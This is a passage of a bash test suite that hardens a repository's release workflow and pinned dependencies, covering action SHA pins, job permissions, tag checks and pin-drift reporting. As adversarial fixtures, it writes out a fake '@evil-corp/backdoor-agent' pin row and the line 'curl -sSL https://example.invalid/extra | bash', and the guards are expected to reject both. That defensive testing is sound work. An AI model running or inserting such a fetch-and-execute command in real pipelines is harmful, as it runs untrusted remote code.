pin_map_fixture() {  # -> a scratch copy of the tracked tree
    local dir; dir="$(mktemp -d "$TMP/pinmap.XXXXXX")"
    git ls-files -z | tar --null -T - -cf - | tar -xf - -C "$dir"
    printf '%s\n' "$dir"
}
pin_map_case() {  # label, mutation (+add | -remove | old=>new), expected fragment
    local label="$1" mutation="$2" fragment="$3" root out rc=0
    root="$(pin_map_fixture)"
    python3 - "$root/checksums/AI_CLI_VERSIONS.txt" "$mutation" <<'PY'
import sys
path, mutation = sys.argv[1], sys.argv[2]
text = open(path).read()
if mutation.startswith("+"):
    text += mutation[1:] + "\n"
elif mutation.startswith("-"):
    text = text.replace(mutation[1:] + "\n", "", 1)
else:
    old, new = mutation.split("=>", 1)
    assert text.count(old) == 1, f"fixture anchor not unique: {old!r}"
    text = text.replace(old, new, 1)
open(path, "w").write(text)
PY
    out="$(bash tools/check-pins.sh "$root" 2>&1)" || rc=$?
    (( rc != 0 )) && grep -qF -- "$fragment" <<< "$out" \
        && ok "check-pins rejects $label" \
        || bad "check-pins accepted $label (rc=$rc): $(head -2 <<< "$out" | tr '\n' ' ')"
    rm -rf "$root"
}

pin_map_root="$(pin_map_fixture)"
bash tools/check-pins.sh "$pin_map_root" >/dev/null 2>&1 \
    && ok "the check-pins fixture tree is clean before the adversarial rows" \
    || bad "the check-pins fixture tree is not clean before the adversarial rows"
# Prose in NODE_SHA256.txt is not a keyed row and must not be treated as one.
bash tools/check-pins.sh "$pin_map_root" 2>&1 | grep -qF 'NODE_SHA256.txt' \
    && bad "check-pins mistook prose in NODE_SHA256.txt for a version row" \
    || ok "prose in a checksums file is not mistaken for a version row"
rm -rf "$pin_map_root"

claude_pin="$(sed -n 's|^@anthropic-ai/claude-code \(.*\)$|\1|p' checksums/AI_CLI_VERSIONS.txt)"
codex_pin="$(sed -n 's|^@openai/codex \(.*\)$|\1|p' checksums/AI_CLI_VERSIONS.txt)"
# The exact bypass: an unknown key paired with a version that really is pinned.
pin_map_case "an unknown key paired with an existing canonical version" \
    "+@evil-corp/backdoor-agent $claude_pin" "unmapped key"
pin_map_case "a known key paired with another tool's canonical version" \
    "@openai/codex $codex_pin=>@openai/codex $claude_pin" "wrong value"
pin_map_case "a missing key" "-@openai/codex $codex_pin" "missing key"
pin_map_case "a duplicate key" "+@openai/codex $codex_pin" "duplicate key"
pin_map_case "an extra key carrying a novel version" "+@acme/tool 9.9.9" "unmapped key"
pin_map_case "a malformed row" "+@openai/codex $codex_pin extra-field" "malformed row"
pin_map_case "a stale value" "@openai/codex $codex_pin=>@openai/codex 0.0.1" "wrong value"

# A coordinated bump of every recording surface must still pass, with no literal
# here to update -- that is what makes deriving the expectation worth doing.
bump_root="$(pin_map_fixture)"
python3 - "$bump_root" "$claude_pin" <<'PY'
import pathlib, sys
root, old = pathlib.Path(sys.argv[1]), sys.argv[2]
head, _, patch = old.rpartition(".")
new = f"{head}.{int(patch) + 1}"
for rel in ("lib/bootstrap/config.sh", "config.example.env",
            "checksums/AI_CLI_VERSIONS.txt", "README.md", "docs/CONFIGURATION.md"):
    path = root / rel
    path.write_text(path.read_text().replace(old, new))
PY
bash tools/check-pins.sh "$bump_root" >/dev/null 2>&1 \
    && ok "a coordinated pin bump still passes with no test literal to update" \
    || bad "a coordinated pin bump was rejected: $(bash tools/check-pins.sh "$bump_root" 2>&1 | head -2 | tr '\n' ' ')"
rm -rf "$bump_root"

section "Release rehearsal in CI"
# release.yml only runs on a tag push, so its checkout is detached, one commit
# deep, and carries a single tag. ci.yml is triggered by every push including
# that one, so it does see the shape -- but only at the moment the tag lands,
# which is after the version number has been spent and SECURITY.md forbids
# reusing it. That is how PASS: 233 FAIL: 4 reached the v2.2.1 release instead
# of a pull request. ci.yml's tag-checkout job manufactures the shape on every
# branch push and pull request; these assertions keep it from being quietly
# deleted or defanged.
#
# It rehearses the Git metadata a tag build sees. It is not a tag event: it does
# not reproduce GITHUB_REF_TYPE=tag, the event payload, the expression context
# release.yml reads github.ref_name from, the origin URL, the fetch refspec, or
# the checkout's authentication state.
#
# Every check here reads the workflows with comment lines removed. A command
# named only in a comment is not a command that runs.
rehearsal_drift=0
tag_job="$(grep -vE '^[[:space:]]*#' .github/workflows/ci.yml \
    | awk '/^  tag-checkout:$/{f=1; next} /^  [A-Za-z]/{f=0} f')"
if [[ -z "$tag_job" ]]; then
    bad "ci.yml has no tag-checkout job"
    rehearsal_drift=1
else
    while IFS='|' read -r label needle; do
        [[ -n "$label" ]] || continue
        grep -qF -- "$needle" <<< "$tag_job" \
            || { bad "the tag-checkout job does not $label"; rehearsal_drift=1; }
    done <<'REHEARSAL'
build a shallow single-tag clone|--depth 1 --branch
assert the clone is shallow|.git/shallow
run the release preflight|bash tools/release-preflight.sh
rehearse the tag check|--tag "v$(tr -d '[:space:]' < VERSION)"
REHEARSAL
    # The opt-in would hand the job every tag and hide the one shape it exists
    # to reproduce, so its absence is the assertion.
    if grep -qF -- 'SB_CHECK_PUBLISHED_TAGS' <<< "$tag_job"; then
        bad "the tag-checkout job sets SB_CHECK_PUBLISHED_TAGS, hiding the shape it tests"
        rehearsal_drift=1
    fi
fi
(( rehearsal_drift == 0 )) && ok "ci.yml rehearses the release under a tag-shaped checkout"

# What replaced the old cross-check, and why the old one is gone.
#
# It extracted "commands" from both workflows with an awk program over
# whitespace-split YAML text and asserted the release set was a subset of the CI
# set. Verified against that function on bf04bd0: it accepted
# `- name: run bash tools/gitleaks.sh path` and `run: echo "bash tools/x.sh"`,
# and could not see /usr/bin/bash, `bash -e`, an interpreter in a variable, a
# make target, a composite action or a reusable workflow. It also normalised
# arguments away, so `build-release.sh --skip-tests` counted as covering
# `build-release.sh`. A green result was not evidence of the property it named,
# and the one release-only step it could never see -- the inline tag check --
# is exactly the kind of thing it existed to catch.
#
# There is nothing left to prove by reading YAML, because there is one
# implementation: tools/release-preflight.sh. This asserts only that, and says
# so plainly. It is a guard against release.yml growing a second script, not a
# proof that CI runs everything release does. It can still be fooled by a
# preflight invocation that is echoed rather than run -- but then nothing in the
# job runs at all, which is not a subtle failure.
workflow_scripts() {  # repository scripts a workflow file names, comments aside
    grep -vE '^[[:space:]]*#' "$1" \
        | grep -oE '\b(tools|tests|release)/[A-Za-z0-9_.-]+\.sh' \
        | LC_ALL=C sort -u
}
# One function, used for the shipped file and for every fixture below, so the
# guard the suite reports on is the guard the fixtures exercise. It prints each
# violation it finds and nothing when the file is acceptable.
release_workflow_violations() {
    local file="$1" body scripts named runs uses
    body="$(grep -vE '^[[:space:]]*#' "$file")"
    scripts="$(grep -oE '\b(tools|tests|release)/[A-Za-z0-9_.-]+\.sh' <<< "$body" \
        | LC_ALL=C sort -u | tr '\n' ' ')"
    [[ "$scripts" == "tools/release-preflight.sh " ]] \
        || printf 'invokes [%s] instead of only the preflight\n' "${scripts% }"
    # A script named in a step label runs nothing. That evasion satisfied the
    # extractor this guard replaced.
    named="$(grep -E '^[[:space:]]*-?[[:space:]]*name:' <<< "$body" \
        | grep -oE '\b(tools|tests|release)/[A-Za-z0-9_.-]+\.sh' | LC_ALL=C sort -u | tr '\n' ' ')"
    [[ -z "$named" ]] || printf 'names [%s] in a step label, which runs nothing\n' "${named% }"
    # A script path is not the only way to add a release-only step: `make
    # release`, a composite action and a reusable workflow all name no .sh file.
    # Counting the steps closes that, and is a claim this file's shape supports:
    # release.yml is a checkout, one run:, and one upload.
    runs="$(grep -cE '^[[:space:]]*-?[[:space:]]*run:' <<< "$body" || true)"
    [[ "$runs" == 1 ]] || printf 'has %s run: steps; a release-only one cannot be ruled out\n' "$runs"
    # sort, NOT sort -u: multiplicity is part of the claim. A second Publish
    # assets step -- correctly pinned, with the right version comment, and
    # accepted by actionlint -- would upload the release twice, and collapsing
    # the list with -u made that indistinguishable from one step. The same held
    # for a duplicated checkout. The release job uses actions/checkout exactly
    # once and softprops/action-gh-release exactly once; this compares the whole
    # sorted list against that, so both an extra action and a repeated one fail.
    # See #47.
    uses="$(grep -oE '^[[:space:]]*-?[[:space:]]*uses:[[:space:]]*\S+' <<< "$body" \
        | sed -E 's|.*uses:[[:space:]]*||; s|@.*||' | LC_ALL=C sort | tr '\n' ' ')"
    [[ "$uses" == "actions/checkout softprops/action-gh-release " ]] \
        || printf 'uses [%s]; the release job must use actions/checkout exactly once and softprops/action-gh-release exactly once\n' "${uses% }"
    # Counting run: steps bounds how many there are, not what the one contains.
    # A block scalar is what lets extra commands ride along inside the single
    # permitted step: `curl ... | bash` and `make extra` each add no step and
    # name no .sh file, so every check above accepted them and the assertion
    # still said "and nothing else". The one permitted step is therefore matched
    # as an exact literal -- a comparison, not a parser, so there is no
    # extraction to evade. See #47.
    grep -qxF '        run: bash tools/release-preflight.sh --tag "$CANDIDATE_TAG"' <<< "$body" \
        || printf 'does not invoke the preflight as one exact single-line command\n'
}
release_violations="$(release_workflow_violations .github/workflows/release.yml)"
[[ -z "$release_violations" ]] \
    && ok "release.yml runs one step: the preflight, as an exact single-line command" \
    || bad "release.yml ${release_violations//$'\n'/; }"
workflow_scripts .github/workflows/ci.yml | grep -qFx tools/release-preflight.sh \
    && ok "ci.yml runs the same preflight script" \
    || bad "ci.yml does not run tools/release-preflight.sh"
# The inline tag check moved into a script that takes the candidate as an
# argument, so it is testable and so ci.yml can rehearse it.
grep -qF "tr -d '[:space:]' < VERSION" .github/workflows/release.yml \
    && bad "release.yml still verifies the tag inline instead of through the preflight" \
    || ok "the tag check is a script, not inline release-only shell"
# And the text extractor cannot come back: it is the thing that created false
# confidence, and a narrower version of it would create less of it, not none.
grep -qE '^workflow_commands\(\)' tests/run-tests.sh \
    && bad "the YAML command-text extractor is back in tests/run-tests.sh" \
    || ok "no YAML command-text extractor in the suite"

# The guard, against fixture workflows -- including every evasion that defeated
# its predecessor.
release_guard() {  # label, expect (accept|reject), file
    local label="$1" expect="$2" file="$3" violations
    violations="$(release_workflow_violations "$file")"
    if [[ -z "$violations" ]]; then
        [[ "$expect" == accept ]] && ok "the release-workflow guard accepts $label" \
            || bad "the release-workflow guard accepted $label"
    else
        [[ "$expect" == reject ]] && ok "the release-workflow guard rejects $label" \
            || bad "the release-workflow guard rejected $label: $violations"
    fi
}
guard_fixture="$TMP/release-fixture.yml"
restore_guard_fixture() { cp .github/workflows/release.yml "$guard_fixture"; }
restore_guard_fixture
release_guard "the shipped release.yml" accept "$guard_fixture"
printf '      - run: bash tools/other-thing.sh\n' >> "$guard_fixture"
release_guard "a second script" reject "$guard_fixture"
restore_guard_fixture
printf '      - run: /usr/bin/bash tools/other-thing.sh\n' >> "$guard_fixture"
release_guard "a second script run through an absolute interpreter path" reject "$guard_fixture"
restore_guard_fixture
printf '      - run: make release-extra\n' >> "$guard_fixture"
release_guard "a make target, which names no script" reject "$guard_fixture"
restore_guard_fixture
printf '      - uses: ./.github/actions/extra\n' >> "$guard_fixture"
release_guard "a composite action" reject "$guard_fixture"
restore_guard_fixture
printf '      - uses: ./.github/workflows/extra.yml\n' >> "$guard_fixture"
release_guard "a reusable workflow" reject "$guard_fixture"
restore_guard_fixture
sed -i '/bash tools\/release-preflight.sh/d' "$guard_fixture"
release_guard "the preflight removed" reject "$guard_fixture"
restore_guard_fixture
sed -i 's|^\( *\)run: bash tools/release-preflight.sh.*|\1name: run bash tools/release-preflight.sh|' "$guard_fixture"
release_guard "a preflight named in a step label but never run" reject "$guard_fixture"
# The evasions a step count and a .sh scan cannot see: extra commands inside the
# single run: step that is legitimately there. Both passed every check this
# guard had before #47, while the assertion claimed "and nothing else".
guard_inline_fixture() {  # extra command -> fixture with it inside the one run:
    restore_guard_fixture
    SB_GUARD_EXTRA="$1" python3 - "$guard_fixture" <<'PY'
import os, sys
path = sys.argv[1]
text = open(path).read()
one = '        run: bash tools/release-preflight.sh --tag "$CANDIDATE_TAG"'
assert text.count(one) == 1
block = ('        run: |\n'
         '          bash tools/release-preflight.sh --tag "$CANDIDATE_TAG"\n'
         '          ' + os.environ["SB_GUARD_EXTRA"])
open(path, 'w').write(text.replace(one, block, 1))
PY
}
guard_inline_fixture 'curl -sSL https://example.invalid/extra | bash'
release_guard "an extra inline command in the one run: step" reject "$guard_fixture"
guard_inline_fixture 'make release-only-extra'
release_guard "a make target inside the one run: step" reject "$guard_fixture"
restore_guard_fixture
# Multiplicity, not just membership. Each of these duplicates a step that is
# legitimately there, with the correct pinned SHA and version comment, so the
# action-pin guard and actionlint both accept them -- and a duplicated upload
# step would publish the release assets twice.
restore_guard_fixture
python3 - "$guard_fixture" <<'PY'
import sys
path = sys.argv[1]
text = open(path).read()
marker = '      - name: Publish assets'
assert text.count(marker) == 1
open(path, 'w').write(text + "\n" + text[text.index(marker):].rstrip("\n") + "\n")
PY
release_guard "a second, identical release-upload step" reject "$guard_fixture"
restore_guard_fixture
python3 - "$guard_fixture" <<'PY'
import re
import sys
path = sys.argv[1]
text = open(path).read()
# Read the checkout step out of the file rather than restating its SHA: a pin
# literal in this suite is itself a standing failure, and duplicating whatever
# is actually pinned is the stronger fixture anyway.
found = re.search(r'^ *- uses: actions/checkout@[^\n]*\n(?: +[^\n]*\n)*', text, re.M)
assert found, "no checkout step found in the fixture"
block = found.group(0)
open(path, 'w').write(text.replace(block, block + "\n" + block, 1))
PY
release_guard "a second, identical checkout step" reject "$guard_fixture"
restore_guard_fixture

# The tag check itself, offline, against a scratch VERSION file.
tag_check_drift=0
printf '2.2.2\n' > "$TMP/VERSION-fixture"
while IFS='|' read -r candidate expected; do
    [[ -n "$candidate" || "$expected" == 2 ]] || continue
    actual=0
    bash tools/check-release-tag.sh "$candidate" "$TMP/VERSION-fixture" >/dev/null 2>&1 || actual=$?
    [[ "$actual" == "$expected" ]] \
        || { bad "check-release-tag '$candidate' exited $actual, expected $expected"; tag_check_drift=1; }
done <<'TAGS'
v2.2.2|0
v2.2.3|1
v3.0.0|1
2.2.2|2
v2.2|2
v2.2.2.1|2
v2.2.2-rc1|2
v2.2.2+build1|2
refs/tags/v2.2.2|2
v02.2.2|2
V2.2.2|2
v2.2.2 |2
|2
TAGS
(( tag_check_drift == 0 )) && ok "the release tag check accepts only an exact, well-formed match"
# A prerelease has never been published here, and accepting one would let it
# publish as if it were the release. Keep the refusal explicit.
prerelease_out="$(bash tools/check-release-tag.sh v2.2.2-rc1 "$TMP/VERSION-fixture" 2>&1 || true)"
grep -qF 'expected v<major>.<minor>.<patch> with no suffix' <<< "$prerelease_out" \
    && ok "a prerelease tag is refused with a reason" \
    || bad "prerelease refusal message: $prerelease_out"
# And against the repository's own VERSION, which is what release.yml passes.
bash tools/check-release-tag.sh "v$(tr -d '[:space:]' < VERSION)" >/dev/null 2>&1 \
    && ok "the current VERSION has a valid release tag form" \
    || bad "v$(tr -d '[:space:]' < VERSION) is not accepted by the tag check"

# Workflow syntax is validated by a YAML-aware linter, pinned and checksum
# verified the same way the secret scanner is, rather than by regexes here.
actionlint_drift=0
grep -qF 'bash tools/actionlint.sh run' .github/workflows/ci.yml \
    || { bad "ci.yml does not run actionlint"; actionlint_drift=1; }
grep -qE '^ACTIONLINT_VERSION=[0-9]+\.[0-9]+\.[0-9]+$' tools/actionlint.sh \
    || { bad "actionlint is not pinned to an exact version"; actionlint_drift=1; }
grep -qE '^ACTIONLINT_SHA256_LINUX_X64=[0-9a-f]{64}$' tools/actionlint.sh \
    || { bad "the actionlint download is not checksum-pinned"; actionlint_drift=1; }
grep -qF 'sha256sum --check --status' tools/actionlint.sh \
    || { bad "actionlint.sh does not verify the archive it downloads"; actionlint_drift=1; }
(( actionlint_drift == 0 )) && ok "workflows are linted by a pinned, verified actionlint"

# The preflight is the thing both workflows call, so its own sequence is the
# release contract. Assert it still contains every gate rather than trusting
# that moving a step out of a workflow moved it into here.
preflight_drift=0
while IFS='|' read -r label needle; do
    [[ -n "$label" ]] || continue
    grep -qF -- "$needle" tools/release-preflight.sh \
        || { bad "the release preflight no longer $label"; preflight_drift=1; }
done <<'PREFLIGHT'
checks the candidate tag|tools/check-release-tag.sh
resolves the pinned scanner|tools/gitleaks.sh" path
runs the reproducible build|release/build-release.sh
scans the artifacts before upload|scan-artifacts release/dist
PREFLIGHT
(( preflight_drift == 0 )) && ok "the release preflight still runs every pre-publication gate"

section "Workflow supply chain: immutable action pins and least privilege"
# Every uses: in this repository pointed at a mutable major tag, including the
# two steps in the job that holds contents: write. A tag is a pointer: the owner
# -- or anyone who compromises the owner's account -- can move it to different
# code, and the next run picks that code up with no diff here and no review.
# Pinning to a commit SHA is what makes "what ran" a reviewable fact. See #27.
#
# The version comment is not decoration: it is what a reader and Dependabot both
# use to tell which release a SHA is, so a pin without one is only half a pin.
workflow_uses_violations() {
    local file="$1" line ref
    while IFS= read -r line; do
        ref="${line#*uses:}"; ref="${ref#"${ref%%[![:space:]]*}"}"; ref="${ref%%[[:space:]]*}"
        # A local action (./…) has no upstream to pin; nothing here uses one,
        # and the release-workflow guard rejects adding one.
        [[ "$ref" == ./* ]] && { printf '%s: local action %s\n' "$file" "$ref"; continue; }
        if [[ ! "$ref" =~ ^[A-Za-z0-9._-]+/[A-Za-z0-9._-]+@[0-9a-f]{40}$ ]]; then
            printf '%s: %s is not pinned to a full commit SHA\n' "$file" "$ref"
            continue
        fi
        grep -qE "uses:[[:space:]]*${ref//\//\\/}[[:space:]]+# v[0-9]" <<< "$line" \
            || printf '%s: %s has no version comment\n' "$file" "$ref"
    done < <(grep -vE '^[[:space:]]*#' "$file" | grep -E '^[[:space:]]*-?[[:space:]]*uses:' \
        | sed -E 's/^[[:space:]]*-?[[:space:]]*/  /')
}
uses_drift=0
for workflow in .github/workflows/*.yml; do
    while IFS= read -r violation; do
        [[ -n "$violation" ]] || continue
        bad "action pin: $violation"; uses_drift=1
    done < <(workflow_uses_violations "$workflow")
done
(( uses_drift == 0 )) && ok "every action is pinned to a full commit SHA with a version comment"

# The shape check against fixtures, because the assertion above passes trivially
# on a file with no uses: at all.
uses_fixture="$TMP/uses-fixture.yml"
uses_guard() {  # label, expect (accept|reject), line
    printf 'jobs:\n  j:\n    steps:\n      - uses: %s\n' "$3" > "$uses_fixture"
    if [[ -z "$(workflow_uses_violations "$uses_fixture")" ]]; then
        [[ "$2" == accept ]] && ok "the action-pin guard accepts $1" \
            || bad "the action-pin guard accepted $1"
    else
        [[ "$2" == reject ]] && ok "the action-pin guard rejects $1" \
            || bad "the action-pin guard rejected $1"
    fi
}
uses_guard "a full SHA with a version comment" accept \
    'actions/checkout@1111111111111111111111111111111111111111  # v4.4.0'
uses_guard "a mutable major tag" reject 'actions/checkout@v4'
uses_guard "a branch" reject 'actions/checkout@main'
uses_guard "a short SHA" reject 'actions/checkout@1111111  # v4.4.0'
uses_guard "a full SHA with no version comment" reject \
    'actions/checkout@1111111111111111111111111111111111111111'
uses_guard "a local composite action" reject './.github/actions/thing'

# Least privilege, per job rather than per file: a second job added to
# release.yml must start with no write access rather than inheriting it.
perm_drift=0
for workflow in .github/workflows/*.yml; do
    grep -qE '^permissions:' "$workflow" \
        && { bad "$workflow grants permissions at the workflow level"; perm_drift=1; }
    while IFS= read -r job; do
        [[ -n "$job" ]] || continue
        block="$(grep -vE '^[[:space:]]*#' "$workflow" \
            | awk -v want="  $job:" '$0 == want {f=1; next} /^  [A-Za-z]/{f=0} f')"
        grep -qE '^    permissions:' <<< "$block" \
            || { bad "$workflow job '$job' declares no permissions"; perm_drift=1; }
        if grep -qE '^      contents:[[:space:]]*write' <<< "$block"; then
            [[ "$workflow:$job" == ".github/workflows/release.yml:publish" ]] \
                || { bad "$workflow job '$job' takes contents: write"; perm_drift=1; }
        fi
    done < <(grep -vE '^[[:space:]]*#' "$workflow" \
        | awk '/^jobs:$/{f=1; next} /^[A-Za-z]/{f=0} f' \
        | sed -nE 's/^  ([A-Za-z][A-Za-z0-9_-]*):$/\1/p')
done
grep -qE '^      contents:[[:space:]]*write' .github/workflows/release.yml \
    || { bad "the publish job cannot upload without contents: write"; perm_drift=1; }
(( perm_drift == 0 )) && ok "every job declares its permissions and only publish can write"

# pull_request_target runs with the base repository's secrets and a writable
# token; combining it with a checkout of pull-request head content is the
# standard way a repository gets compromised, and actions/checkout v7 blocks
# that combination for exactly this reason. #41 considered a bot-facing
# automation that would have needed it and rejected the option. Nothing here
# uses the trigger, and this asserts nothing quietly starts.
if grep -lq 'pull_request_target' .github/workflows/*.yml 2>/dev/null; then
    bad "a workflow uses pull_request_target"
else
    ok "no workflow uses pull_request_target"
fi

# The #41 remedy step is a diagnostic, not a gate. It must stay conditional on
# failure -- promoted to an unconditional step it would run on green builds, and
# made part of the suite it could start deciding whether a run passes.
if grep -q 'bash tools/manifest-fix-hint.sh' .github/workflows/ci.yml; then
    grep -B2 'bash tools/manifest-fix-hint.sh' .github/workflows/ci.yml | grep -q 'if: failure()' \
        && ok "the stale-manifest hint runs only after a failure" \
        || bad "the stale-manifest hint is no longer conditional on failure"
else
    bad "ci.yml no longer runs the stale-manifest hint"
fi

# No job here performs an authenticated Git operation after checkout, so none
# needs the token left in .git/config. The tag-checkout job clones
# file://$GITHUB_WORKSPACE, which needs no credentials at all.
cred_drift=0
for workflow in .github/workflows/*.yml; do
    while IFS= read -r finding; do
        [[ -n "$finding" ]] || continue
        bad "$workflow: $finding"; cred_drift=1
    done < <(grep -vE '^[[:space:]]*#' "$workflow" | awk '
        /uses:[[:space:]]*actions\/checkout@/ { pending = 1; seen = 0; next }
        pending && /^[[:space:]]*-[[:space:]]/ {
            if (!seen) print "a checkout does not set persist-credentials: false"
            pending = 0
        }
        pending && /persist-credentials:[[:space:]]*false/ { seen = 1 }
        END { if (pending && !seen) print "a checkout does not set persist-credentials: false" }
    ')
done
(( cred_drift == 0 )) && ok "no checkout leaves a token in .git/config"

# The upload authenticates through its own input, which is what makes the line
# above safe to assert rather than hope about.
grep -qF 'token: ${{ secrets.GITHUB_TOKEN }}' .github/workflows/release.yml \
    && ok "the release upload names its token explicitly" \
    || bad "the release upload relies on an implicit token"

# A pin with no update channel is a pin that rots.
dependabot_drift=0
if [[ ! -f .github/dependabot.yml ]]; then
    bad "no .github/dependabot.yml, so nothing proposes action updates"
    dependabot_drift=1
else
    while IFS='|' read -r label needle; do
        [[ -n "$label" ]] || continue
        grep -qE -- "$needle" .github/dependabot.yml \
            || { bad "dependabot.yml does not $label"; dependabot_drift=1; }
    done <<'DEPENDABOT'
declare the v2 schema|^version: 2$
watch the github-actions ecosystem|package-ecosystem:[[:space:]]*["'\'']?github-actions
check on a schedule|interval:[[:space:]]*(daily|weekly|monthly)
DEPENDABOT
fi
(( dependabot_drift == 0 )) && ok "Dependabot proposes action updates against the pins"

section "Weekly pin-drift workflow"
# Pin drift is only found when somebody runs the check, and between releases
# nobody does. The weekly job could not be built on the old --check: it exited 1
# permanently because of the branch-head row, and 0 when every resolver failed.
# With the exit codes #25 established it can tell three cases apart, and the
# branch on each is a pure function driven here without a network or a token.
# See #28.
drift_opts_before="$-"
# shellcheck source=tools/pin-drift-report.sh
source tools/pin-drift-report.sh
[[ "$-" == "$drift_opts_before" ]] \
    && ok "sourcing pin-drift-report.sh does not change shell options" \
    || bad "sourcing pin-drift-report.sh changed shell options"
grep -qF '[[ "${BASH_SOURCE[0]}" != "$0" ]] || pin_drift_main "$@"' tools/pin-drift-report.sh \
    && ok "pin-drift-report.sh has a main guard, so sourcing it calls no API" \
    || bad "pin-drift-report.sh has no main guard"

# Every combination of (refresh-pins exit, is an issue already open). The two
# that matter: exit 0 with no issue files nothing at all, and exit 3 files the
# issue *and* fails the run -- a check that could not check must not show a
# green tick.
drift_drift=0
while IFS='|' read -r code has_issue expect_action expect_run; do
    [[ -n "$code" ]] || continue
    actual_run=green
    actual_action="$(pin_drift_action "$code" "$has_issue")" || actual_run=red
    [[ "$actual_action" == "$expect_action" && "$actual_run" == "$expect_run" ]] \
        || { bad "pin-drift(exit $code, issue $has_issue) = $actual_action/$actual_run, expected $expect_action/$expect_run"; drift_drift=1; }
done <<'DRIFT'
0|no|nothing|green
0|yes|close|green
1|no|create|green
1|yes|update|green
3|no|create|red
3|yes|update|red
2|no|fail|red
2|yes|fail|red
99|no|fail|red
DRIFT
(( drift_drift == 0 )) && ok "the drift workflow files one issue only for actionable release drift"

# The UNKNOWN banner is the visible half of "never a false green".
printf 'nodejs 24.21.0 unknown UNKNOWN\n' > "$TMP/drift-report.txt"
unknown_body="$(pin_drift_body 3 "$TMP/drift-report.txt")"
stale_body="$(pin_drift_body 1 "$TMP/drift-report.txt")"
grep -qF 'This report is incomplete' <<< "$unknown_body" \
    && ok "an UNKNOWN result says so at the top of the issue" \
    || bad "an UNKNOWN result is reported as an ordinary drift issue"
grep -qF 'This report is incomplete' <<< "$stale_body" \
    && bad "an ordinary drift issue carries the UNKNOWN banner" \
    || ok "an ordinary drift issue carries no UNKNOWN banner"
grep -qF 'nodejs 24.21.0 unknown UNKNOWN' <<< "$stale_body" \
    && ok "the issue body quotes the report verbatim" || bad "the issue body drops the report"

# The workflow itself. It is scheduled, it can be dispatched by hand, it holds
# only the permission it needs, and it must never rewrite a pin: a bump needs a
# CHANGELOG entry and a human reading the upstream diff.
drift_workflow=.github/workflows/pin-drift.yml
workflow_drift=0
if [[ ! -f "$drift_workflow" ]]; then
    bad "no weekly pin-drift workflow"
    workflow_drift=1
else
    drift_body="$(grep -vE '^[[:space:]]*#' "$drift_workflow")"
    while IFS='|' read -r label needle; do
        [[ -n "$label" ]] || continue
        grep -qE -- "$needle" <<< "$drift_body" \
            || { bad "the pin-drift workflow does not $label"; workflow_drift=1; }
    done <<'DRIFTWF'
run on a schedule|^[[:space:]]+- cron:
allow a manual run|^[[:space:]]*workflow_dispatch:
grant issues: write|^[[:space:]]+issues:[[:space:]]*write$
bound its runtime|^[[:space:]]+timeout-minutes:[[:space:]]*[0-9]+$
run the check|refresh-pins\.sh --check
hand the result to the reporter|pin-drift-report\.sh
DRIFTWF
    grep -qE 'refresh-pins\.sh[^|]*--write' <<< "$drift_body" \
        && { bad "the pin-drift workflow can rewrite pins"; workflow_drift=1; }
    grep -qE '^[[:space:]]+contents:[[:space:]]*write$' <<< "$drift_body" \
        && { bad "the pin-drift workflow takes contents: write"; workflow_drift=1; }
    # The report is upstream-controlled text. It reaches the issue through a
    # file, never through a command line.
    grep -qF -- '--body-file' tools/pin-drift-report.sh \
        || { bad "the drift report is interpolated into a command instead of a file"; workflow_drift=1; }
fi
(( workflow_drift == 0 )) && ok "the pin-drift workflow reports weekly and cannot write"

section "Fitness: documentation says what the code does"
# Three claims in this repository were true when written and stopped being true
# without anything noticing: the --write file list, the CHANGELOG's explanation
# of why a bug was undetectable, and what "checksum-verified" covers. See #29.

# 1. The --write file list. tools/write-pins.py is the writer, so the files it
# names are the answer; three prose lists have to agree with it. checksums/*.txt
# collapses to the directory, which is how all three write it.
doc_list_drift=0
while IFS= read -r target; do
    [[ -n "$target" ]] || continue
    [[ "$target" == checksums/* ]] && target=checksums/
    while IFS='|' read -r where file; do
        [[ -n "$where" ]] || continue
        grep -qF -- "$target" "$file" \
            || { bad "$where does not name $target, which tools/write-pins.py rewrites"; doc_list_drift=1; }
    done <<'LISTS'
README.md's --write paragraph|README.md
docs/CONFIGURATION.md|docs/CONFIGURATION.md
the refresh-pins.sh banner|tools/refresh-pins.sh
LISTS
done < <(grep -oE '"[A-Za-z0-9_./-]+\.(sh|md|env|txt|py)"' tools/write-pins.py \
    | tr -d '"' | LC_ALL=C sort -u)
(( doc_list_drift == 0 )) && ok "every file --write rewrites is named everywhere --write is documented"
# And nothing may claim the rewrite is atomic across files: it validates every
# substitution before the first write, but the writes are per file.
grep -qiF 'atomic across' tools/write-pins.py \
    && grep -qiF 'atomic across' docs/CONFIGURATION.md \
    && ok "the rewrite's guarantee is stated as validation, not atomicity" \
    || bad "the multi-file rewrite is described as atomic somewhere"

# 2. CHANGELOG. An Unreleased heading is what stops the next merged change going
# unrecorded, which is how #20, #21 and #22 came to be recorded nowhere.
changelog_drift=0
first_heading="$(grep -m1 '^## ' CHANGELOG.md)"
[[ "$first_heading" == "## Unreleased" ]] \
    || { bad "CHANGELOG.md's first section is '$first_heading', not Unreleased"; changelog_drift=1; }
declared="$(tr -d '[:space:]' < VERSION)"
grep -qF "## $declared" CHANGELOG.md \
    || { bad "CHANGELOG.md has no section for the released version $declared"; changelog_drift=1; }
# The 2.2.2 notes explain the bug by saying every CI job checks out a branch.
# #22 made that false. The sentence stays as history; the correction has to be
# next to it, or the release notes read as current fact.
if grep -qF 'Every CI job checks out a branch' CHANGELOG.md; then
    grep -qF 'Corrected 2026-09-12' CHANGELOG.md \
        || { bad "CHANGELOG.md still claims every CI job checks out a branch, uncorrected"; changelog_drift=1; }
fi
(( changelog_drift == 0 )) && ok "CHANGELOG.md has an Unreleased section and no uncorrected claim"

# 3. "Checksum-verified" covers Node.js, uv, gh and ngrok, whose downloaded artifacts
# are checked against SHA-256 values pinned here. It does not cover the AI CLIs:
# lib/bootstrap/ai_cli.sh runs one npm install at exact versions and then reads
# the installed package.json back. That is a real guarantee, from npm and the
# registry, but a different one.
grep -qiE 'sha256|checksum' lib/bootstrap/ai_cli.sh \
    && bad "lib/bootstrap/ai_cli.sh now has a checksum path; the documentation split needs revisiting" \
    || ok "the AI CLI installer still has no checksum path, as the docs now say"
# A literal check, so it is brittle to rewording on purpose: each of these
# sentences claimed a repository checksum covers the npm CLIs.
claim_drift=0
while IFS='|' read -r file phrase; do
    [[ -n "$file" ]] || continue
    grep -qF -- "$phrase" "$file" \
        && { bad "$file still claims: $phrase"; claim_drift=1; }
done <<'CLAIMS'
README.md|checksum-verified before use
README.md|Tools pinned to a checksummed upstream release
docs/CONFIGURATION.md|Tools that are pinned to a checksummed upstream release
CLAIMS
